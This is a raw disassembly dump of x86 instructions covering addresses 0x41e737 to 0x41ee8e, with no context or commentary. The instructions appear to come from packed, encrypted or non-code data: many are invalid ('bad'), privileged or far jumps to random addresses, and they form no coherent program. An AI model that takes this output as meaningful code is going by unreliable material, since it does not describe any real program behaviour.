  41e737:	dec    ebp
  41e738:	cmp    BYTE PTR [edi+eax*2+0x12124959],ch
  41e73f:	inc    esp
  41e740:	imul   ebp,DWORD PTR [edi],0x13
  41e743:	dec    ecx
  41e744:	stos   BYTE PTR es:[edi],al
  41e745:	dec    esi
  41e746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e747:	das    
  41e748:	in     eax,dx
  41e749:	(bad)  
  41e74a:	push   eax
  41e74b:	stc    
  41e74c:	xchg   edi,eax
  41e74d:	std    
  41e74e:	pop    ss
  41e74f:	daa    
  41e750:	mov    ch,0xa
  41e752:	adc    al,0x98
  41e754:	ja     0x41e73e
  41e756:	push   edx
  41e757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e758:	cmp    al,0xdf
  41e75a:	jg     0x41e709
  41e75c:	adc    eax,0x8a8a89f6
  41e761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e762:	int3   
  41e763:	je     0x41e760
  41e765:	push   edx
  41e766:	scas   al,BYTE PTR es:[edi]
  41e767:	cli    
  41e768:	cmp    BYTE PTR [edi+ebp*4+0x6f],0x63
  41e76d:	jb     0x41e707
  41e76f:	(bad)  
  41e770:	js     0x41e750
  41e772:	jmp    0xa188c8e3
  41e777:	into   
  41e778:	jmp    0x7027:0x4e9d9360
  41e77f:	xchg   ebp,eax
  41e780:	mov    ah,cl
  41e782:	sbb    BYTE PTR [edi+0x1f8aefc7],dh
  41e788:	in     eax,0x52
  41e78a:	sub    BYTE PTR [edx-0x249b1c85],bh
  41e790:	cdq    
  41e791:	inc    ecx
  41e792:	pop    ebp
  41e793:	pusha  
  41e794:	or     eax,0x2f5e2de2
  41e799:	and    BYTE PTR [edi-0xe57cae5],0x3c
  41e7a0:	neg    BYTE PTR [ebx]
  41e7a2:	shl    BYTE PTR ds:0xad74db8e,0x20
  41e7a9:	in     al,0xb
  41e7ab:	inc    edi
  41e7ac:	test   esp,0x4cdfbf0c
  41e7b2:	hlt    
  41e7b3:	adc    eax,0x4f6c1dbc
  41e7b8:	cmp    al,0xf8
  41e7ba:	and    al,0x4
  41e7bc:	(bad)  [eax+esi*8-0xb]
  41e7c0:	sahf   
  41e7c1:	add    bh,BYTE PTR [edx]
  41e7c3:	ins    DWORD PTR es:[edi],dx
  41e7c4:	in     eax,dx
  41e7c5:	popa   
  41e7c6:	jb     0x41e77e
  41e7c8:	hlt    
  41e7c9:	push   esi
  41e7ca:	mov    ch,0x30
  41e7cc:	jmp    0x41e760
  41e7ce:	loope  0x41e843
  41e7d0:	dec    eax
  41e7d1:	mov    bh,BYTE PTR [esi]
  41e7d3:	adc    al,0xd7
  41e7d5:	pop    es
  41e7d6:	rol    BYTE PTR [eax-0x1e],0x97
  41e7da:	sub    ecx,DWORD PTR [ecx+0x394ee735]
  41e7e0:	jbe    0x41e79e
  41e7e2:	jns    0x41e7b9
  41e7e4:	inc    ebx
  41e7e5:	dec    ebx
  41e7e6:	clc    
  41e7e7:	mov    ebp,0x5393e49f
  41e7ec:	cmp    eax,esi
  41e7ee:	lock pop edi
  41e7f0:	call   0xbbcc68b2
  41e7f5:	adc    DWORD PTR [eax+0x46],esi
  41e7f8:	cli    
  41e7f9:	xor    al,0xc3
  41e7fb:	or     BYTE PTR [edx+0x67],0x95
  41e7ff:	push   edi
  41e800:	pop    ds
  41e801:	retf   0x128c
  41e804:	xor    BYTE PTR [ecx],al
  41e806:	jns    0x41e7ab
  41e808:	lods   al,BYTE PTR ds:[esi]
  41e809:	nop
  41e80a:	mov    cs,WORD PTR [ebx-0x66]
  41e80d:	mov    edx,0xf5a5a192
  41e812:	sbb    DWORD PTR [ebp+0x39],esp
  41e815:	sbb    esi,eax
  41e817:	pop    ebp
  41e818:	sbb    DWORD PTR [ebp-0x79],0xed88e3ad
  41e81f:	push   edx
  41e820:	sbb    DWORD PTR [ebx+eiz*4],edx
  41e823:	iret   
  41e824:	push   ds
  41e825:	mov    ecx,0xdafe9f0a
  41e82a:	out    0xb4,al
  41e82c:	push   eax
  41e82d:	fld    QWORD PTR [ecx]
  41e82f:	jne    0x41e7dc
  41e831:	or     ebp,DWORD PTR [esi-0x19b240bf]
  41e837:	not    DWORD PTR [esi+ebp*4+0xdcb1833]
  41e83e:	dec    esp
  41e83f:	es (bad) 
  41e841:	int    0x77
  41e843:	and    DWORD PTR ds:0x2ce61ae0,edi
  41e849:	outs   dx,BYTE PTR ds:[esi]
  41e84a:	xor    al,bh
  41e84c:	mov    bl,0xc0
  41e84e:	push   edi
  41e84f:	mov    ch,BYTE PTR [esi+eax*4]
  41e852:	jnp    0x41e7f3
  41e854:	mov    eax,ds:0x9ce139cd
  41e859:	xchg   ebx,eax
  41e85a:	mov    bh,BYTE PTR [ebx+0x36bee193]
  41e860:	les    ebp,FWORD PTR [ecx]
  41e862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e863:	iret   
  41e864:	test   dh,bh
  41e866:	xor    al,0x6d
  41e868:	sti    
  41e869:	sbb    bh,bh
  41e86b:	pop    edx
  41e86c:	sub    eax,0x98521967
  41e871:	cwde   
  41e872:	test   eax,0x6e099101
  41e877:	cdq    
  41e878:	aaa    
  41e879:	add    eax,DWORD PTR [edx+0xc]
  41e87c:	call   0x70d8:0x1ce1372
  41e883:	sti    
  41e884:	adc    esp,DWORD PTR [esi+esi*2]
  41e887:	stos   BYTE PTR es:[edi],al
  41e888:	push   edx
  41e889:	adc    DWORD PTR [esi-0x101c99c0],esp
  41e88f:	jmp    0x467c:0xc13ddfef
  41e896:	dec    edi
  41e897:	bnd call 0xf1a223ba
  41e89d:	mov    dl,0xd1
  41e89f:	pop    ss
  41e8a0:	addr16 xor dl,bh
  41e8a3:	push   0x48b54666
  41e8a8:	jl     0x41e8a8
  41e8aa:	(bad)  
  41e8ab:	clc    
  41e8ac:	pushf  
  41e8ad:	adc    BYTE PTR [ebx],ah
  41e8af:	in     al,dx
  41e8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8b2:	in     al,0x0
  41e8b4:	int    0x99
  41e8b6:	aad    0x3f
  41e8b8:	arpl   WORD PTR [ebp+0x632b258f],bx
  41e8be:	push   edx
  41e8bf:	push   0xfffffff1
  41e8c1:	fld    TBYTE PTR [ebx]
  41e8c3:	dec    ebx
  41e8c4:	stos   DWORD PTR es:[edi],eax
  41e8c5:	ret    
  41e8c6:	popf   
  41e8c7:	adc    ebp,ecx
  41e8c9:	mov    WORD PTR [eax+0x463649b8],?
  41e8cf:	(bad)  
  41e8d0:	mov    dl,0x40
  41e8d2:	push   edx
  41e8d3:	xchg   DWORD PTR [eax-0x47],ebx
  41e8d6:	test   bh,0x60
  41e8d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8da:	add    bh,0x29
  41e8dd:	adc    eax,0x18c62836
  41e8e2:	pop    ebp
  41e8e3:	adc    ecx,DWORD PTR [ebx-0x4f7db1d0]
  41e8e9:	add    eax,0xb8f1af80
  41e8ee:	out    dx,eax
  41e8ef:	mov    eax,ds:0x1b8d6f83
  41e8f4:	jbe    0x41e95b
  41e8f6:	push   ebx
  41e8f7:	daa    
  41e8f8:	in     eax,0x15
  41e8fa:	fcom   DWORD PTR [ecx]
  41e8fc:	push   0xa13b61cb
  41e901:	pop    edi
  41e902:	xchg   ebx,eax
  41e903:	lods   eax,DWORD PTR ds:[esi]
  41e904:	out    dx,al
  41e905:	mov    dh,0x2
  41e907:	mov    al,ds:0x674e3f18
  41e90c:	aam    0x11
  41e90e:	mov    al,ds:0x235c4bf7
  41e913:	mov    bh,0x76
  41e915:	xchg   ecx,eax
  41e916:	cmp    eax,0x148928ec
  41e91b:	mov    esi,0x8098af7f
  41e920:	mov    esi,0xc0b11e5d
  41e925:	call   0x59c6:0xf3b76624
  41e92c:	retf   0xfc18
  41e92f:	mov    ds:0xc3c9fe39,al
  41e934:	jge    0x41e99b
  41e936:	(bad)  
  41e938:	loop   0x41e8dc
  41e93a:	xchg   edi,eax
  41e93b:	in     eax,dx
  41e93c:	xchg   edx,eax
  41e93d:	push   edx
  41e93e:	mov    WORD PTR [eax-0x50],es
  41e941:	push   0x6cb23e6b
  41e946:	or     edx,esp
  41e948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e949:	imul   DWORD PTR [edx+ebx*1]
  41e94c:	dec    edi
  41e94d:	repnz cmp cl,ah
  41e950:	int3   
  41e951:	push   cs
  41e952:	lods   al,BYTE PTR ds:[esi]
  41e953:	loope  0x41e9b5
  41e955:	push   ds
  41e956:	arpl   dx,bp
  41e958:	pop    ecx
  41e959:	mov    ds:0x3819f72e,al
  41e95e:	sbb    DWORD PTR [esi-0xa145b42],edi
  41e964:	xlat   BYTE PTR ds:[ebx]
  41e965:	iret   
  41e966:	aas    
  41e967:	pop    esp
  41e968:	mov    ?,WORD PTR ss:[ecx]
  41e96b:	imul   eax,DWORD PTR [edx+0x46],0x47
  41e96f:	mov    cl,0xde
  41e971:	(bad)  
  41e972:	loopne 0x41e902
  41e974:	inc    edx
  41e975:	cmp    ebp,DWORD PTR [edx+0x10]
  41e978:	test   BYTE PTR [ebp+0x53],bh
  41e97b:	lods   al,BYTE PTR ds:[esi]
  41e97c:	aas    
  41e97d:	sar    DWORD PTR [eax],0xfe
  41e980:	adc    BYTE PTR [edi+0x19c321a5],dl
  41e986:	sub    al,0xf5
  41e988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e989:	sbb    ebp,DWORD PTR [edi-0x2a9fda72]
  41e98f:	arpl   WORD PTR [ecx+ebp*2],sp
  41e992:	xchg   esp,eax
  41e993:	dec    eax
  41e994:	add    DWORD PTR [ecx+0x4e],ebp
  41e997:	or     esi,eax
  41e999:	cmp    al,0xec
  41e99b:	mov    DWORD PTR [ebp+0x1e67eca0],esp
  41e9a1:	jns    0x41e95e
  41e9a3:	or     ebp,0xffffffaa
  41e9a6:	lods   eax,DWORD PTR ds:[esi]
  41e9a7:	inc    edx
  41e9a8:	lds    esi,FWORD PTR [ebp-0x76]
  41e9ab:	call   0xe35b946d
  41e9b0:	jecxz  0x41e9cd
  41e9b2:	jno    0x41e993
  41e9b4:	lods   eax,DWORD PTR ds:[esi]
  41e9b5:	sbb    al,0xe2
  41e9b7:	sub    edi,DWORD PTR ds:0x91179630
  41e9bd:	mov    eax,ds:0x11c6946
  41e9c2:	mov    ch,0x29
  41e9c4:	or     al,bh
  41e9c6:	sub    BYTE PTR [ecx+ecx*4+0x47],0xd4
  41e9cb:	(bad)  
  41e9cc:	pop    esp
  41e9cd:	pop    ss
  41e9ce:	adc    ebp,edx
  41e9d0:	in     eax,dx
  41e9d1:	cli    
  41e9d2:	outs   dx,DWORD PTR ds:[esi]
  41e9d3:	add    al,0xb7
  41e9d5:	sub    eax,0x3e31855a
  41e9da:	retf   
  41e9db:	jg     0x41e9d6
  41e9dd:	xor    DWORD PTR [edi+edi*2+0x6c],0x77
  41e9e2:	ret    0x5fc6
  41e9e5:	sbb    al,0xbd
  41e9e7:	sbb    eax,DWORD PTR ds:0x7b411091
  41e9ed:	push   eax
  41e9ee:	sub    edx,DWORD PTR [ecx+edi*2+0x214a02a8]
  41e9f5:	bnd js 0xba1a29b2
  41e9fc:	push   esp
  41e9fd:	inc    edi
  41e9fe:	or     DWORD PTR [eax+edi*1],esp
  41ea01:	add    al,0x3
  41ea03:	and    ecx,DWORD PTR [ecx+edi*2+0x6506a718]
  41ea0a:	fisub  DWORD PTR [edx+0x57c54cc5]
  41ea10:	dec    edx
  41ea11:	and    DWORD PTR [edi-0x6053b788],esi
  41ea17:	call   0x9629:0x201c7f4d
  41ea1e:	xchg   ecx,eax
  41ea1f:	scas   al,BYTE PTR es:[edi]
  41ea20:	sti    
  41ea21:	loope  0x41ea51
  41ea23:	jle    0x41ea78
  41ea25:	icebp  
  41ea26:	out    0xf5,al
  41ea28:	retf   0x1b79
  41ea2b:	fdiv   QWORD PTR [esi-0x38]
  41ea2e:	mov    cl,0x38
  41ea30:	sbb    ebp,DWORD PTR [esi+0xd]
  41ea33:	repnz outs dx,BYTE PTR ds:[esi]
  41ea35:	scas   al,BYTE PTR es:[edi]
  41ea36:	addr16 (bad) 
  41ea39:	sub    DWORD PTR [ecx+ebx*4+0x54439ac],eax
  41ea40:	inc    esp
  41ea41:	adc    ebp,DWORD PTR [ecx-0x5dcc18d1]
  41ea47:	(bad)  
  41ea48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea49:	mov    bh,0x6a
  41ea4b:	scas   al,BYTE PTR es:[edi]
  41ea4c:	ds or  al,0xcc
  41ea4f:	pop    es
  41ea50:	xchg   DWORD PTR [ebx+0x72],edi
  41ea53:	or     ah,BYTE PTR [esp+eiz*2+0x7a]
  41ea57:	add    al,0xcc
  41ea59:	jmp    0x41e9eb
  41ea5b:	and    BYTE PTR ds:0xa2b40818,ah
  41ea61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea62:	fdivr  DWORD PTR [edi]
  41ea64:	or     al,BYTE PTR [eax-0x6f5c9840]
  41ea6a:	pusha  
  41ea6b:	and    DWORD PTR [ecx+eiz*8-0x1e],ecx
  41ea6f:	mov    ch,0xbe
  41ea71:	and    DWORD PTR [eax+0x65],ebp
  41ea74:	test   al,0x80
  41ea76:	out    dx,al
  41ea77:	mov    al,al
  41ea79:	xor    esi,DWORD PTR [esi]
  41ea7b:	add    bl,dh
  41ea7d:	rol    eax,0x42
  41ea80:	out    0x77,al
  41ea82:	retf   
  41ea83:	gs and al,0x16
  41ea86:	sbb    BYTE PTR [ebp+ebp*2-0x67e562da],ch
  41ea8d:	fmul   QWORD PTR [ebx+0x6310fef5]
  41ea93:	dec    edx
  41ea94:	ds loop 0x41ea8d
  41ea97:	and    al,0xf1
  41ea99:	xchg   dl,ah
  41ea9b:	test   al,0x50
  41ea9d:	or     BYTE PTR [edx-0x397f74f],0xbf
  41eaa4:	sub    eax,0xe3dc9235
  41eaa9:	fwait
  41eaaa:	lods   al,BYTE PTR ds:[esi]
  41eaab:	cmp    al,0xe6
  41eaad:	cmp    eax,0xf41ea5c6
  41eab2:	mov    DWORD PTR ds:0xc88a947b,ebp
  41eab8:	xchg   esp,eax
  41eab9:	cmp    BYTE PTR [ebp+edx*1-0x28],dl
  41eabd:	inc    edx
  41eabe:	push   esi
  41eabf:	call   DWORD PTR [edi+ebp*4]
  41eac2:	push   0x21225c7e
  41eac7:	mov    eax,0xbb45a30c
  41eacc:	fst    st(1)
  41eace:	sub    DWORD PTR [edx+0x5f],edi
  41ead1:	jge    0x41ead1
  41ead3:	shl    esi,1
  41ead5:	jg     0x41eb0f
  41ead7:	fiadd  WORD PTR [ebx+edi*2-0x238d2ab6]
  41eade:	adc    BYTE PTR [edi+0xdc533f5],0x79
  41eae5:	cmp    DWORD PTR [ecx+0x33],edx
  41eae8:	rcr    BYTE PTR [eax-0x3fc947c6],cl
  41eaee:	jecxz  0x41eaaa
  41eaf0:	imul   edx,DWORD PTR [ecx+eax*2+0x37],0x5564d8ee
  41eaf8:	mov    ebx,0xa3cbef6f
  41eafd:	loopne 0x41eb01
  41eaff:	popa   
  41eb00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb01:	xchg   esi,eax
  41eb02:	aaa    
  41eb03:	pop    ebp
  41eb04:	xor    al,0x6
  41eb06:	pop    ebp
  41eb07:	xor    edx,DWORD PTR [edx]
  41eb09:	pop    esp
  41eb0a:	mov    eax,0xb46c5b7b
  41eb0f:	fsub   st,st(2)
  41eb11:	shr    BYTE PTR [edi],1
  41eb13:	jp     0x41eb3c
  41eb15:	add    ebx,DWORD PTR [ecx-0x54]
  41eb18:	cmc    
  41eb19:	inc    ebp
  41eb1a:	in     al,0xf7
  41eb1c:	fsub   DWORD PTR [edx+0x22dc1e52]
  41eb22:	shl    BYTE PTR [ebp+0xe],1
  41eb25:	inc    esi
  41eb26:	push   edi
  41eb27:	cmp    ah,BYTE PTR [ecx+edi*1]
  41eb2a:	dec    DWORD PTR [edi+0x1551f274]
  41eb30:	das    
  41eb31:	dec    ebx
  41eb32:	stc    
  41eb33:	dec    esp
  41eb34:	in     eax,0x83
  41eb36:	add    eax,0x59bfc741
  41eb3b:	or     eax,0x845a5b02
  41eb40:	add    edx,ebp
  41eb42:	aam    0x20
  41eb44:	pop    ds
  41eb45:	in     al,0xe
  41eb47:	cmp    eax,0x694ad9e
  41eb4c:	pop    esp
  41eb4d:	jmp    0x41eb53
  41eb4f:	js     0x41eb9c
  41eb51:	sbb    bh,BYTE PTR [ebx-0x2805d772]
  41eb57:	in     al,dx
  41eb58:	jno    0x41ebd2
  41eb5a:	push   ebx
  41eb5b:	dec    esi
  41eb5c:	test   ebp,0x880e6d1d
  41eb62:	repnz iret 
  41eb64:	sub    BYTE PTR [esi-0x5ecbd9fd],ch
  41eb6a:	sti    
  41eb6b:	sbb    al,0x8d
  41eb6d:	sub    eax,0x4a4e3864
  41eb72:	inc    edi
  41eb73:	aad    0xbc
  41eb75:	iret   
  41eb76:	shl    BYTE PTR [ebp+0xa],0xce
  41eb7a:	adc    BYTE PTR [edi+0x4f83b56b],bh
  41eb80:	fist   WORD PTR [edx-0x33df1b5f]
  41eb86:	or     BYTE PTR [ebp+0x17],ah
  41eb89:	adc    dh,dh
  41eb8b:	and    cl,0xf6
  41eb8e:	xchg   BYTE PTR [ebp+0x55ebf7c],dl
  41eb94:	add    edx,DWORD PTR [ebx]
  41eb96:	inc    eax
  41eb97:	adc    eax,0x90a02600
  41eb9c:	push   ebp
  41eb9d:	inc    ecx
  41eb9e:	jae    0x41ec1f
  41eba0:	shr    BYTE PTR [ecx+0x6d9f1060],1
  41eba6:	dec    ecx
  41eba7:	scas   eax,DWORD PTR es:[edi]
  41eba8:	sbb    al,0x2c
  41ebaa:	jns    0x41ebec
  41ebac:	inc    eax
  41ebad:	sbb    eax,0xed82d3d7
  41ebb2:	mov    WORD PTR [ebx-0x4c],gs
  41ebb5:	and    al,0xab
  41ebb7:	test   BYTE PTR [ebp+eiz*1-0x555c1e35],cl
  41ebbe:	rcl    bl,1
  41ebc0:	or     ebx,esp
  41ebc2:	int    0x81
  41ebc4:	xor    eax,0xf7755e08
  41ebc9:	adc    ebx,DWORD PTR [ebp+0x5c8d4fc6]
  41ebcf:	xor    eax,0xfb5f44e0
  41ebd4:	ins    BYTE PTR es:[edi],dx
  41ebd5:	scas   eax,DWORD PTR es:[edi]
  41ebd6:	sahf   
  41ebd7:	sti    
  41ebd8:	mov    ch,0xd1
  41ebda:	(bad)
  41ebdf:	xor    eax,0x8bb49d8b
  41ebe4:	jns    0x41ebcf
  41ebe6:	dec    esp
  41ebe7:	cdq    
  41ebe8:	dec    eax
  41ebe9:	cmp    al,0x38
  41ebeb:	and    BYTE PTR [esi-0x8],ch
  41ebee:	mov    al,0x9f
  41ebf0:	call   0xd710:0xf3f2bf60
  41ebf7:	shr    BYTE PTR ds:0xb6ad6da6,0xfb
  41ebfe:	inc    ebp
  41ebff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec00:	adc    eax,0x2d0e2821
  41ec05:	or     BYTE PTR [ebp+0x44322f93],ch
  41ec0b:	aas    
  41ec0c:	mov    edx,0x18c09d88
  41ec11:	enter  0xf572,0x70
  41ec15:	retf   
  41ec16:	call   0xdfe6:0xae47a8b4
  41ec1d:	mov    bh,0x3f
  41ec1f:	jmp    0x41ec97
  41ec21:	jns    0x41ec36
  41ec23:	jp     0x41ec42
  41ec25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec26:	fnstcw WORD PTR [eax]
  41ec28:	fsub   DWORD PTR [esi]
  41ec2a:	test   BYTE PTR [ecx+eiz*1+0x23],0x6a
  41ec2f:	or     cl,ah
  41ec31:	nop
  41ec32:	mov    DWORD PTR [esi+ecx*1+0x22],ecx
  41ec36:	mov    dl,BYTE PTR [edx+edx*2-0x19]
  41ec3a:	aad    0x40
  41ec3c:	ret    
  41ec3d:	adc    esi,DWORD PTR [ebx]
  41ec3f:	(bad)
  41ec43:	sbb    edx,DWORD PTR [edi]
  41ec45:	dec    esp
  41ec46:	inc    edi
  41ec47:	sbb    DWORD PTR [ebx-0x454757c1],eax
  41ec4d:	mov    eax,0xbabce7
  41ec52:	pusha  
  41ec53:	mov    ?,ebx
  41ec55:	lods   al,BYTE PTR ds:[esi]
  41ec56:	inc    ecx
  41ec57:	ror    BYTE PTR [ebx+0x2ce095c3],1
  41ec5d:	push   edi
  41ec5e:	popf   
  41ec5f:	dec    ebp
  41ec60:	pop    ebx
  41ec61:	sti    
  41ec62:	pusha  
  41ec63:	sub    DWORD PTR [edi-0x132f5f86],edx
  41ec69:	mov    esp,gs
  41ec6b:	int    0x23
  41ec6d:	mov    bh,0xd
  41ec6f:	gs or  al,0x4b
  41ec72:	cmc    
  41ec73:	dec    esi
  41ec74:	sub    BYTE PTR [edx+0x5],dl
  41ec77:	(bad)  
  41ec78:	mov    dl,0x3
  41ec7a:	or     DWORD PTR [esi],edx
  41ec7c:	ret    0xf93c
  41ec7f:	sub    bh,BYTE PTR [esi+0x37fbdaa3]
  41ec85:	push   edi
  41ec86:	out    dx,eax
  41ec87:	jl     0x41ec0c
  41ec89:	stos   DWORD PTR es:[edi],eax
  41ec8a:	xchg   edi,eax
  41ec8b:	sahf   
  41ec8c:	stos   DWORD PTR es:[edi],eax
  41ec8d:	arpl   ax,bp
  41ec8f:	enter  0x3d97,0x48
  41ec93:	sahf   
  41ec94:	adc    edx,eax
  41ec96:	xchg   esp,eax
  41ec97:	dec    ebx
  41ec98:	imul   DWORD PTR [ebx-0x46]
  41ec9b:	fwait
  41ec9c:	and    BYTE PTR [ebx-0x8130f8b],0xa1
  41eca3:	jmp    0x41ec4d
  41eca5:	sub    WORD PTR [ebp+0x71c71b8d],dx
  41ecac:	pusha  
  41ecad:	fcmovnbe st,st(2)
  41ecaf:	adc    eax,0x6347ce90
  41ecb4:	inc    ebp
  41ecb5:	(bad)  [ebx+0x1]
  41ecb8:	fsubr  st(1),st
  41ecba:	mov    WORD PTR [eax+0x3f885c93],?
  41ecc0:	adc    BYTE PTR ds:0x2f75f6e8,ch
  41ecc6:	fdiv   DWORD PTR [ecx-0x3b]
  41ecc9:	ins    BYTE PTR es:[edi],dx
  41ecca:	rol    BYTE PTR [edx+0x7a],1
  41eccd:	jno    0x41eca8
  41eccf:	mov    edi,0x541fd865
  41ecd4:	jbe    0x41ec99
  41ecd6:	push   eax
  41ecd7:	adc    eax,0xef18abf7
  41ecdc:	lods   al,BYTE PTR ds:[esi]
  41ecdd:	adc    eax,DWORD PTR [ecx*8+0x71105d6a]
  41ece4:	jns    0x41ec78
  41ece6:	ficom  DWORD PTR [esp+eax*2-0x13]
  41ecea:	inc    edi
  41eceb:	mov    dl,0xd4
  41eced:	and    al,0xd
  41ecef:	and    DWORD PTR [edx],esp
  41ecf1:	mov    eax,0xe4dc7582
  41ecf6:	jb     0x41ecf5
  41ecf8:	adc    DWORD PTR [eax],0xde4a8e84
  41ecfe:	inc    edi
  41ecff:	push   es
  41ed00:	sar    DWORD PTR [edi-0x6e],1
  41ed03:	(bad)  
  41ed04:	jnp    0x41ec99
  41ed06:	fsubr  DWORD PTR [ebx+0x46]
  41ed09:	adc    dl,BYTE PTR [ebx+0x25]
  41ed0c:	dec    edx
  41ed0d:	xor    dl,BYTE PTR [esi-0x43b1613b]
  41ed13:	mov    ebx,0xf1d87d40
  41ed18:	pop    ss
  41ed19:	adc    DWORD PTR [ebx-0x63515b40],ecx
  41ed1f:	inc    ebp
  41ed20:	jo     0x41ed2d
  41ed22:	cmp    al,0xd4
  41ed24:	in     eax,dx
  41ed25:	mov    edx,0xb1e0e025
  41ed2a:	ds xchg ebx,eax
  41ed2c:	out    dx,eax
  41ed2d:	cdq    
  41ed2e:	add    BYTE PTR [ebx],0xb8
  41ed31:	dec    edi
  41ed32:	mov    ecx,0x2be2eaf2
  41ed37:	mov    es,WORD PTR [edi-0x39]
  41ed3a:	fidivr WORD PTR [ebp-0x3f]
  41ed3d:	and    cl,dl
  41ed3f:	adc    al,0x4b
  41ed41:	rcr    dl,cl
  41ed43:	push   0x54
  41ed45:	fcmovne st,st(7)
  41ed47:	pop    ebx
  41ed48:	loope  0x41ed12
  41ed4a:	stc    
  41ed4b:	push   ebx
  41ed4c:	mov    dl,0xf9
  41ed4e:	push   esp
  41ed4f:	jnp    0x41edab
  41ed51:	mov    al,0x90
  41ed53:	clc    
  41ed54:	mov    cl,0x26
  41ed56:	mov    al,ds:0x6b61be7f
  41ed5b:	jecxz  0x41edae
  41ed5d:	icebp  
  41ed5e:	into   
  41ed5f:	sub    al,0xc8
  41ed61:	cwde   
  41ed62:	and    eax,0x3cb5370
  41ed67:	mov    ah,0x48
  41ed69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed6a:	test   DWORD PTR [edi+edi*4],0x8545316f
  41ed71:	add    al,0x42
  41ed73:	rcl    esi,cl
  41ed75:	cmp    edi,DWORD PTR [edi]
  41ed77:	mov    WORD PTR [edx-0x5f],ss
  41ed7a:	pop    ebp
  41ed7b:	push   edi
  41ed7c:	gs and al,0x97
  41ed7f:	shr    DWORD PTR [esi+ebx*1-0x73d8fc3e],0x2f
  41ed87:	int3   
  41ed88:	mov    edx,0x99321e1
  41ed8d:	test   bl,bh
  41ed8f:	pop    ds
  41ed90:	or     DWORD PTR [edx+0x5d],esi
  41ed93:	rcl    edi,1
  41ed95:	outs   dx,BYTE PTR ds:[esi]
  41ed96:	std    
  41ed97:	stos   BYTE PTR es:[edi],al
  41ed98:	jge    0x41edb2
  41ed9a:	add    al,0x3d
  41ed9c:	xor    eax,0xaf63f25a
  41eda1:	retf   0x4389
  41eda4:	and    DWORD PTR [edx+0x1a],0x7b
  41eda8:	sub    BYTE PTR [edi],dh
  41edaa:	xchg   ebx,eax
  41edab:	and    al,0x8b
  41edad:	enter  0xbbee,0xcc
  41edb1:	pop    ebx
  41edb2:	add    ah,BYTE PTR [edx-0x58]
  41edb5:	inc    ecx
  41edb6:	arpl   WORD PTR [edx+edi*1],di
  41edb9:	cmp    DWORD PTR [edx],0xc68e2c6
  41edbf:	pop    ebp
  41edc0:	pop    eax
  41edc1:	icebp  
  41edc2:	aad    0x56
  41edc4:	das    
  41edc5:	cmp    eax,DWORD PTR ds:0xe074fca8
  41edcb:	add    ebp,edx
  41edcd:	push   ss
  41edce:	jg     0x41ed52
  41edd0:	out    dx,al
  41edd1:	cwde   
  41edd2:	xchg   ecx,eax
  41edd3:	lea    eax,[ebp+0x60da52]
  41edd9:	shl    DWORD PTR [eax+0x14],1
  41eddc:	cmp    eax,0xcf3cd51d
  41ede1:	or     BYTE PTR [edx],ch
  41ede3:	jge    0x41ee5d
  41ede5:	mov    cl,BYTE PTR [eax+0x26]
  41ede8:	and    ebp,DWORD PTR [ebx+0x19]
  41edeb:	and    ebx,0x47
  41edee:	in     al,dx
  41edef:	push   ss
  41edf0:	cmovae edi,eax
  41edf3:	push   ds
  41edf4:	cs sub al,0x31
  41edf7:	mov    al,0xfe
  41edf9:	inc    ecx
  41edfa:	hlt    
  41edfb:	or     BYTE PTR [ecx+0x5a],bl
  41edfe:	retf   0xf2c5
  41ee01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee02:	push   ds
  41ee03:	and    esp,DWORD PTR [ecx-0x2ac9b136]
  41ee09:	and    bl,BYTE PTR [esi+0x5c]
  41ee0c:	sub    ebx,DWORD PTR [esi]
  41ee0e:	imul   esi,DWORD PTR [ebp-0x5c],0x5b114d1
  41ee15:	test   BYTE PTR [ebx],cl
  41ee17:	loope  0x41ee44
  41ee19:	stos   BYTE PTR es:[edi],al
  41ee1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee1b:	jmp    0x52f0cc09
  41ee20:	jge    0x41edb5
  41ee22:	adc    BYTE PTR [esi+0x48],cl
  41ee25:	imul   ecx,DWORD PTR [esi],0xca0df6f7
  41ee2b:	pop    ebp
  41ee2c:	inc    ebx
  41ee2d:	cld    
  41ee2e:	or     DWORD PTR [edx],0x5f
  41ee31:	mov    ebx,0xbfe852f6
  41ee36:	adc    BYTE PTR [ebx+0x6bbe822d],ah
  41ee3c:	sbb    edx,edi
  41ee3e:	mov    BYTE PTR [edx-0x3f],bh
  41ee41:	call   0x6a3e:0x23ec1d99
  41ee48:	add    al,0x5f
  41ee4a:	xchg   esp,eax
  41ee4b:	jecxz  0x41eeab
  41ee4d:	shl    BYTE PTR [edi-0x65],cl
  41ee50:	and    esi,edx
  41ee52:	or     dh,bl
  41ee54:	and    DWORD PTR [ebx+0x445a6633],edi
  41ee5a:	push   ss
  41ee5b:	js     0x41ede0
  41ee5d:	sub    eax,0x6aa34a0b
  41ee62:	add    BYTE PTR [ecx],bh
  41ee64:	jp     0x41eedf
  41ee66:	xor    eax,0xdc74da3c
  41ee6b:	push   ecx
  41ee6c:	cwde   
  41ee6d:	mov    bl,0xa3
  41ee6f:	cdq    
  41ee70:	and    DWORD PTR [edi+0x61768d83],esp
  41ee76:	fst    QWORD PTR [esp+ebp*2-0x66]
  41ee7a:	pop    ebx
  41ee7b:	mov    bl,0x4b
  41ee7d:	push   cs
  41ee7e:	jo     0x41ee54
  41ee80:	jb     0x41ee9b
  41ee82:	jmp    0x41ee09
  41ee84:	cmp    al,0xd7
  41ee86:	mov    ch,0x78
  41ee88:	xor    al,0xe2
  41ee8a:	test   BYTE PTR [edi],ch
  41ee8c:	jae    0x41eeed
  41ee8e:	lahf   
